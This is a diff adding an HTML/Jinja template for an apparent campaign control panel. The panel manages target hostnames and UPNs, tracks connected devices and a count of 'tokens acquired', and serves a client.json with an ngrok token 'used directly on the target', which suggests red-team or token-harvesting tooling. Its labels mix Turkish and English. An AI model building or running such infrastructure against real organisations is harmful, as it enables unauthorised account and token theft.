@@ -1,0 +1,340 @@
+{% extends 'base.html' %}
+
+{% block title %}{{ campaign.name }}{% endblock %}
+
+{% block content %}
+{% set status_map = {
+    'pending': ('Bekliyor', 'bg-gray-100 text-gray-600'),
+    'registered': ('Registered', 'bg-blue-100 text-blue-800'),
+    'authenticated': ('Verified', 'bg-green-100 text-green-800')
+} %}
+<div x-data="{ editOpen: false, importOpen: false }" class="space-y-6">
+
+    <div class="flex flex-wrap items-start justify-between gap-3">
+        <div class="min-w-0">
+            <div class="flex items-center gap-2 text-sm text-gray-500 mb-1">
+                <a href="{{ url_for('campaign.list_campaigns') }}" class="hover:text-indigo-600">Campaigns</a>
+                <span>/</span>
+                <span class="text-gray-400">Detay</span>
+            </div>
+            <h2 class="text-2xl font-bold text-gray-900 truncate">{{ campaign.name }}</h2>
+            {% if campaign.description %}
+            <p class="mt-1 text-sm text-gray-500 max-w-2xl">{{ campaign.description }}</p>
+            {% endif %}
+        </div>
+        <div class="flex items-center gap-2 shrink-0">
+            <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full
+                {{ 'bg-yellow-100 text-yellow-800' if campaign.status == 'draft' else ('bg-green-100 text-green-800' if campaign.status == 'active' else 'bg-gray-100 text-gray-600') }}">
+                {{ campaign.status_label }}
+            </span>
+            {% if campaign.status != 'active' %}
+            <form method="post" action="{{ url_for('campaign.launch_campaign', campaign_id=campaign.id) }}">
+                <button type="submit" class="bg-green-600 hover:bg-green-700 text-white text-sm font-medium py-1.5 px-3 rounded-md transition-colors">Activate</button>
+            </form>
+            {% endif %}
+            {% if campaign.status == 'active' %}
+            <form method="post" action="{{ url_for('campaign.complete_campaign', campaign_id=campaign.id) }}">
+                <button type="submit" class="bg-gray-600 hover:bg-gray-700 text-white text-sm font-medium py-1.5 px-3 rounded-md transition-colors">Tamamla</button>
+            </form>
+            {% endif %}
+        </div>
+    </div>
+
+    <div class="grid grid-cols-2 md:grid-cols-5 gap-4">
+        <div class="bg-white shadow-sm rounded-xl border border-gray-100 p-4">
+            <p class="text-xs font-medium text-gray-500">Target</p>
+            <p class="mt-1 text-2xl font-bold text-gray-900">{{ stats.targets_total }}</p>
+        </div>
+        <div class="bg-white shadow-sm rounded-xl border border-gray-100 p-4">
+            <p class="text-xs font-medium text-gray-500">Registered</p>
+            <p class="mt-1 text-2xl font-bold text-blue-600">{{ stats.targets_registered }}</p>
+        </div>
+        <div class="bg-white shadow-sm rounded-xl border border-gray-100 p-4">
+            <p class="text-xs font-medium text-gray-500">Connected Device</p>
+            <p class="mt-1 text-2xl font-bold text-gray-900">{{ stats.devices_total }}</p>
+        </div>
+        <div class="bg-white shadow-sm rounded-xl border border-gray-100 p-4">
+            <p class="text-xs font-medium text-gray-500">Online</p>
+            <p class="mt-1 text-2xl font-bold text-green-600">{{ stats.devices_online }}</p>
+        </div>
+        <div class="bg-white shadow-sm rounded-xl border border-gray-100 p-4">
+            <p class="text-xs font-medium text-gray-500">Tokens Acquired</p>
+            <p class="mt-1 text-2xl font-bold text-indigo-600">{{ stats.devices_authenticated }}</p>
+        </div>
+    </div>
+
+    <div class="bg-white shadow-sm rounded-xl border border-gray-100 overflow-hidden">
+        <div class="px-4 py-5 sm:px-6 border-b border-gray-200 flex items-center justify-between">
+            <h3 class="text-lg leading-6 font-medium text-gray-900">Campaign Bilgisi</h3>
+            <button @click="editOpen = !editOpen"
+                    class="text-sm font-medium text-indigo-600 hover:text-indigo-800 inline-flex items-center gap-1">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
+                </svg>
+                <span x-text="editOpen ? 'Close' : 'Edit'">Edit</span>
+            </button>
+        </div>
+
+        <div class="px-4 py-5 sm:px-6">
+            <dl class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-4">
+                <div>
+                    <dt class="text-xs font-medium text-gray-500 uppercase tracking-wide">Target Domain</dt>
+                    <dd class="mt-1 text-sm text-gray-900 font-mono">{{ campaign.target_domain or '— (global setting is used)' }}</dd>
+                </div>
+                <div>
+                    <dt class="text-xs font-medium text-gray-500 uppercase tracking-wide">Campaign Token</dt>
+                    <dd class="mt-1 text-sm">
+                        <div x-data="{ copied: false, showTooltip: false }" class="inline-flex items-center relative">
+                            <code class="bg-gray-100 border border-gray-200 rounded px-2 py-0.5 font-mono text-xs">{{ campaign.campaign_token }}</code>
+                            <button @click="navigator.clipboard.writeText('{{ campaign.campaign_token }}'); copied = true; showTooltip = true; setTimeout(() => {copied = false; showTooltip = false;}, 2000)"
+                                    class="ml-2 text-blue-500 hover:text-blue-700" title="Copy">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                                </svg>
+                            </button>
+                            <div x-show="showTooltip" class="copy-tooltip fade-in">Copied!</div>
+                        </div>
+                        <p class="text-xs text-gray-400 mt-1">Clients send this token via the <code>?c=</code> parameter.</p>
+                    </dd>
+                </div>
+                <div>
+                    <dt class="text-xs font-medium text-gray-500 uppercase tracking-wide">Auth Site</dt>
+                    <dd class="mt-1 text-sm text-gray-900 break-all">{{ campaign.auth_site or server_cfg.get('default_auth_site') or '—' }}</dd>
+                </div>
+                <div>
+                    <dt class="text-xs font-medium text-gray-500 uppercase tracking-wide">Post-Auth URL</dt>
+                    <dd class="mt-1 text-sm text-gray-900 break-all">{{ campaign.post_auth_url or server_cfg.get('default_post_auth_url') or '—' }}</dd>
+                </div>
+                <div>
+                    <dt class="text-xs font-medium text-gray-500 uppercase tracking-wide">Created</dt>
+                    <dd class="mt-1 text-sm text-gray-900">{{ campaign.created_at|humanize }}</dd>
+                </div>
+                <div>
+                    <dt class="text-xs font-medium text-gray-500 uppercase tracking-wide">Launch / Completion</dt>
+                    <dd class="mt-1 text-sm text-gray-900">{{ campaign.launched_at|humanize if campaign.launched_at else '—' }} / {{ campaign.completed_at|humanize if campaign.completed_at else '—' }}</dd>
+                </div>
+            </dl>
+
+            <form x-show="editOpen" x-transition style="display: none;" method="post"
+                  action="{{ url_for('campaign.update_campaign', campaign_id=campaign.id) }}"
+                  class="mt-6 pt-6 border-t border-gray-200 grid grid-cols-1 md:grid-cols-2 gap-4 fade-in">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-1">Ad</label>
+                    <input type="text" name="name" required maxlength="100" value="{{ campaign.name }}"
+                           class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-1">Target Domain</label>
+                    <input type="text" name="target_domain" maxlength="255" value="{{ campaign.target_domain or '' }}"
+                           class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500"
+                           placeholder="ornek.com">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-1">Auth Site</label>
+                    <input type="text" name="auth_site" maxlength="500" value="{{ campaign.auth_site or '' }}"
+                           class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-1">Post-Auth URL</label>
+                    <input type="text" name="post_auth_url" maxlength="500" value="{{ campaign.post_auth_url or '' }}"
+                           class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500">
+                </div>
+                <div class="md:col-span-2">
+                    <label class="block text-sm font-medium text-gray-700 mb-1">Description</label>
+                    <textarea name="description" rows="2"
+                              class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500">{{ campaign.description or '' }}</textarea>
+                </div>
+                <div class="md:col-span-2 flex justify-end gap-2">
+                    <button type="button" @click="editOpen = false"
+                            class="bg-white border border-gray-300 text-gray-700 font-medium py-2 px-4 rounded-md hover:bg-gray-50 text-sm">Cancel</button>
+                    <button type="submit"
+                            class="bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-2 px-4 rounded-md text-sm">Save</button>
+                </div>
+            </form>
+
+            <form method="post" action="{{ url_for('campaign.delete_campaign', campaign_id=campaign.id) }}"
+                  class="mt-6 pt-4 border-t border-gray-200 flex justify-end"
+                  onsubmit="return confirm('This campaign will be deleted (linked devices will be unlinked). Are you sure?');">
+                <button type="submit" class="text-sm text-red-600 hover:text-red-800 font-medium">Campaignyu Delete</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+
+        <div class="bg-white shadow-sm rounded-xl border border-gray-100 overflow-hidden">
+            <div class="px-4 py-5 sm:px-6 border-b border-gray-200">
+                <h3 class="text-lg leading-6 font-medium text-gray-900">Targets</h3>
+                <p class="mt-1 text-sm text-gray-500">Line format: <code>hostname[,upn[,note]]</code></p>
+            </div>
+            <div class="px-4 py-5 sm:px-6 space-y-4">
+                <form method="post" action="{{ url_for('campaign.add_target', campaign_id=campaign.id) }}"
+                      class="grid grid-cols-1 sm:grid-cols-4 gap-2">
+                    <input type="text" name="hostname" required placeholder="HOSTNAME" maxlength="50"
+                           class="border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500">
+                    <input type="text" name="expected_upn" placeholder="beklenen UPN (ops.)"
+                           class="border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500">
+                    <input type="text" name="note" placeholder="not (ops.)" maxlength="500"
+                           class="border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500">
+                    <button type="submit"
+                            class="bg-blue-500 hover:bg-blue-600 text-white text-sm font-medium py-2 px-3 rounded-md transition-colors">Add</button>
+                </form>
+
+                <div>
+                    <button @click="importOpen = !importOpen" class="text-sm font-medium text-indigo-600 hover:text-indigo-800">
+                        <span x-text="importOpen ? 'Close bulk import' : 'Bulk import'">Bulk import</span> &darr;
+                    </button>
+                    <form x-show="importOpen" x-transition style="display: none;" method="post"
+                          action="{{ url_for('campaign.import_targets', campaign_id=campaign.id) }}"
+                          class="mt-2 fade-in">
+                        <textarea name="targets_text" rows="4"
+                                  class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm font-mono focus:ring-indigo-500 focus:border-indigo-500"
+                                  placeholder="PC-001, alice@corp.com, Finance&#10;PC-002&#10;# comment line"></textarea>
+                        <div class="flex justify-end mt-2">
+                            <button type="submit"
+                                    class="bg-indigo-600 hover:bg-indigo-700 text-white text-sm font-medium py-2 px-4 rounded-md">Import Et</button>
+                        </div>
+                    </form>
+                </div>
+
+                {% if campaign.targets %}
+                <div class="overflow-x-auto -mx-4 sm:-mx-6">
+                    <table class="min-w-full divide-y divide-gray-200">
+                        <thead class="bg-gray-50">
+                            <tr>
+                                <th class="px-3 sm:px-6 py-2 text-left text-xs font-medium text-gray-500 uppercase">Hostname</th>
+                                <th class="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase">Status</th>
+                                <th class="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase">UPN / Not</th>
+                                <th class="px-3 py-2"></th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-gray-200">
+                            {% for target in campaign.targets %}
+                            {% set t_label, t_color = status_map.get(target.status, (target.status, 'bg-gray-100 text-gray-600')) %}
+                            <tr class="hover:bg-gray-50">
+                                <td class="px-3 sm:px-6 py-2 text-sm font-medium text-gray-900 whitespace-nowrap">{{ target.hostname }}</td>
+                                <td class="px-3 py-2 whitespace-nowrap">
+                                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full {{ t_color }}">{{ t_label }}</span>
+                                </td>
+                                <td class="px-3 py-2 text-sm text-gray-500">
+                                    {% if target.expected_upn %}<div class="truncate max-w-[16rem]">{{ target.expected_upn }}</div>{% endif %}
+                                    {% if target.note %}<div class="text-xs text-gray-400 truncate max-w-[16rem]">{{ target.note }}</div>{% endif %}
+                                    {% if not target.expected_upn and not target.note %}—{% endif %}
+                                </td>
+                                <td class="px-3 py-2 text-right">
+                                    <form method="post" action="{{ url_for('campaign.delete_target', campaign_id=campaign.id, target_id=target.id) }}"
+                                          onsubmit="return confirm('Delete this target?');">
+                                        <button type="submit" class="text-red-500 hover:text-red-700 text-sm">&times;</button>
+                                    </form>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                {% else %}
+                <p class="text-sm text-gray-400 text-center py-4">No targets added yet.</p>
+                {% endif %}
+            </div>
+        </div>
+
+        <div class="space-y-6">
+            <div class="bg-white shadow-sm rounded-xl border border-gray-100 overflow-hidden">
+                <div class="px-4 py-5 sm:px-6 border-b border-gray-200">
+                    <h3 class="text-lg leading-6 font-medium text-gray-900">Connected Devices</h3>
+                    <p class="mt-1 text-sm text-gray-500">Clients link automatically via the <code>?c=</code> token, or manually from here.</p>
+                </div>
+                <div class="px-4 py-5 sm:px-6 space-y-4">
+                    {% if campaign.devices %}
+                    <ul class="divide-y divide-gray-200 rounded-md border border-gray-200">
+                        {% for device in campaign.devices %}
+                        <li class="flex items-center justify-between gap-3 px-3 py-2">
+                            <div class="min-w-0">
+                                <p class="text-sm font-medium text-gray-900 truncate">{{ device.hostname }}</p>
+                                <p class="text-xs text-gray-500 truncate">
+                                    {{ device.name or device.upn or 'Not authenticated' }} · {{ device.last_seen|humanize }}
+                                </p>
+                            </div>
+                            <div class="flex items-center gap-2 shrink-0">
+                                <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full
+                                    {{ 'bg-green-100 text-green-800' if device.is_online else 'bg-red-100 text-red-800' }}">
+                                    {{ 'Online' if device.is_online else 'Offline' }}
+                                </span>
+                                <form method="post" action="{{ url_for('campaign.unlink_device', campaign_id=campaign.id) }}">
+                                    <input type="hidden" name="device_id" value="{{ device.id }}">
+                                    <button type="submit" class="text-xs text-gray-400 hover:text-red-600" title="Unlink from campaign">Unlink</button>
+                                </form>
+                            </div>
+                        </li>
+                        {% endfor %}
+                    </ul>
+                    {% else %}
+                    <p class="text-sm text-gray-400 text-center py-2">No devices linked to this campaign.</p>
+                    {% endif %}
+
+                    {% if other_devices %}
+                    <form method="post" action="{{ url_for('campaign.link_device', campaign_id=campaign.id) }}"
+                          class="flex gap-2">
+                        <select name="device_id" required
+                                class="flex-grow border border-gray-300 rounded-md px-3 py-2 text-sm focus:ring-indigo-500 focus:border-indigo-500">
+                            <option value="" disabled selected>Select a device…</option>
+                            {% for device in other_devices %}
+                            <option value="{{ device.id }}">{{ device.hostname }}{% if device.campaign %} ({{ device.campaign.name }}){% endif %}</option>
+                            {% endfor %}
+                        </select>
+                        <button type="submit"
+                                class="bg-blue-500 hover:bg-blue-600 text-white text-sm font-medium py-2 px-3 rounded-md transition-colors shrink-0">Link</button>
+                    </form>
+                    {% endif %}
+                </div>
+            </div>
+
+            <div class="bg-white shadow-sm rounded-xl border border-gray-100 overflow-hidden">
+                <div class="px-4 py-5 sm:px-6 border-b border-gray-200">
+                    <h3 class="text-lg leading-6 font-medium text-gray-900">Deployment</h3>
+                    <p class="mt-1 text-sm text-gray-500">Campaign-specific client configuration and endpoint URL.</p>
+                </div>
+                <div class="px-4 py-5 sm:px-6 space-y-4">
+                    <form method="get" class="flex gap-2">
+                        <label class="text-sm text-gray-600 self-center whitespace-nowrap">Sunucu adresi:</label>
+                        <input type="text" name="base" value="{{ base_url }}"
+                               class="flex-grow border border-gray-300 rounded-md px-3 py-2 text-sm font-mono focus:ring-indigo-500 focus:border-indigo-500"
+                               placeholder="https://…">
+                        <button type="submit"
+                                class="bg-gray-100 hover:bg-gray-200 text-gray-700 text-sm font-medium py-2 px-3 rounded-md shrink-0">Uygula</button>
+                    </form>
+
+                    <a href="{{ url_for('campaign.client_config', campaign_id=campaign.id, base=base_url) }}"
+                       class="inline-flex items-center gap-2 bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-2 px-4 rounded-md text-sm transition-colors">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                        </svg>
+                        client.json indir
+                    </a>
+
+                    <div>
+                        <p class="text-xs font-medium text-gray-500 uppercase tracking-wide mb-1">Device endpoint URL'si</p>
+                        <div x-data="{ copied: false, showTooltip: false }" class="relative inline-flex items-center gap-2 max-w-full">
+                            <code class="bg-gray-100 border border-gray-200 rounded px-2 py-1 text-xs font-mono break-all">{{ base_url }}/?h=HOSTNAME&amp;c={{ campaign.campaign_token }}</code>
+                            <button @click="navigator.clipboard.writeText('{{ base_url }}/?h=HOSTNAME&c={{ campaign.campaign_token }}'); copied = true; showTooltip = true; setTimeout(() => {copied = false; showTooltip = false;}, 2000)"
+                                    class="text-blue-500 hover:text-blue-700 shrink-0" title="Copy">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                                </svg>
+                            </button>
+                            <div x-show="showTooltip" class="copy-tooltip fade-in">Copied!</div>
+                        </div>
+                    </div>
+
+                    <p class="text-xs text-gray-400 bg-gray-50 border border-gray-100 rounded-md p-3">
+                        Downloadilen client.json <code>api_url</code>, <code>campaign_token</code>, <code>auth_site</code>,
+                        <code>post_auth_url</code>, <code>health_check_interval</code> and <code>ngrok_token</code>
+                        (if defined in Settings) — the file can be used directly on the target.
+                        Pass it to the client with the <code>--config</code> flag.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
